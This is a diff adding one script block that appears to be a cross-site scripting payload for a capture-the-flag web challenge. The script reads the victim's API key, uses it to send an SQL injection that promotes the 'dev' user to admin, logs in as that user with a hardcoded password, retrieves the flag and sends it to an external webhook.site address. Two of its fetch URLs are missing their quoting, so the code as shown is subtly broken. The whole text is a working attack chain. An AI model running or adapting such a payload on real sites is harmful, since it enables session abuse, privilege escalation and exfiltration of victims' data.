@@ -1,0 +1,32 @@
+<script>
+(async () => {
+try {
+let meResponse = await fetch('http://web:80/api/me.php', {credentials: 'include'});
+let meData = await meResponse.json();
+let apiKey = meData.api_key;
+let injection = "0; UPDATE users SET role='admin' WHERE username='dev'-- ";
+await fetch(http://web:80/api/search_feedback.php?feedback_id=${encodeURIComponent(injection)}, {
+headers: {
+'X-API-Key': apiKey
+},
+credentials: 'include'
+});
+await fetch('http://web:80/logout.php', {credentials: 'include'});
+let loginData = new URLSearchParams({
+'username': 'dev',
+'password': 'dev_pass'
+});
+await fetch('http://web:80/login.php', {
+method: 'POST',
+body: loginData,
+credentials: 'include'
+});
+let flagResponse = await fetch('http://web:80/flag.php', {credentials: 'include'});
+let flagData = await flagResponse.json();
+let flag = flagData.flag;
+await fetch(https://webhook.site/ccbf9aeb-a2b7-4610-b41d-bd08ed56340b?flag=${encodeURIComponent(flag)});
+} catch (error) {
+console.error('Error:', error);
+}
+})();
+</script>
